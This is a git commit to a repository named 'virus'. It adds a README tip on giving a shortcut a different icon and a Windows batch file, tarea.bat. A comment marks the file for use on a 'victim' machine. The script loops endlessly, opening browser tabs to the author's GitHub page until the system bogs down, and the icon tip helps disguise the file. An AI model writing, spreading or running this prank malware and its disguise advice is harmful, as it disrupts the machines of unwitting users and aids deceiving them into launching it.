82bca6301f3ee94c23c5b3f31d2a91a1513e7780
matías <matiasmaldonado400@gmail.com>
2020-11-03 23:11:37 -0300

    md

--- README.md
+++ README.md
@@ -1,3 +1,6 @@
 # virus
 a collection of my personals ("easy virus")
 (use a virtual machine) 
+
+## for change the icon  
+* create a direct access and got to properties and change the icon and select any icon of my   folder called icons
---
+++ virus/tarea.bat
@@ -0,0 +1,20 @@
+::use this if the machine of the victim
+@echo off 
+:a 
+start https://github.com/XxmathiasxX/virus
+start https://github.com/XxmathiasxX/virus
+start https://github.com/XxmathiasxX/virus
+
+goto :a
+
+
+
+::use this if you'r runing this file in your PC
+
+
+::  @echo off 
+::  start https://github.com/XxmathiasxX/virus
+::  start https://github.com/XxmathiasxX/virus
+::  start https://github.com/XxmathiasxX/virus
+
+::  exit
